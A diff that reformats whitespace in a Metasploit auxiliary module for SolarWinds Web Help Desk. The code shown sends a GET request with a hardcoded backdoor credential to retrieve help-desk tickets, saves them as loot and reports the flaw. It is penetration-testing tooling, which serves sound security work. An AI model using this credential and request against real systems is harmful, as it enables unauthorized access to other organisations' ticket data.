@@ -62,7 +62,7 @@ class MetasploitModule < Msf::Auxiliary
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets'),
       'headers' => {
-        'Authorization' => 'Basic ' +  Rex::Text.encode_base64('helpdeskIntegrationUser:dev-C4F8025E7')
+        'Authorization' => 'Basic ' + Rex::Text.encode_base64('helpdeskIntegrationUser:dev-C4F8025E7')
       }
     )
     res
@@ -75,12 +75,12 @@ class MetasploitModule < Msf::Auxiliary
     body = @auth.body
     fail_with(Failure::UnexpectedReply, 'Unexpected Reply: ' + @auth.to_s) unless body.include?('shortSubject')
 
-    report_service( 
-        host: rhost, 
-        port: rport, 
-        proto: 'tcp', 
-        name: 'SolarWinds Web Help Desk'
-      ) 
+    report_service(
+      host: rhost,
+      port: rport,
+      proto: 'tcp',
+      name: 'SolarWinds Web Help Desk'
+    )
 
     jbody = JSON.parse(body)
     print_good('Successfully authenticated and tickets retrieved. The first 1000 characters are displayed below:')
@@ -88,13 +88,13 @@ class MetasploitModule < Msf::Auxiliary
 
     file = store_loot('solarwinds_webhelpdesk.json', 'text/json', datastore['USER'], jbody)
     print_good("Saved tickets to #{file}")
-    
+
     report_vuln(
-          host: rhost,
-          port: rport,
-          name: name,
-          refs: references,
-          info: 'The backdoor helpdeskIntegrationUser:dev-C4F8025E7 works.'
-        )
+      host: rhost,
+      port: rport,
+      name: name,
+      refs: references,
+      info: 'The backdoor helpdeskIntegrationUser:dev-C4F8025E7 works.'
+    )
   end
 end
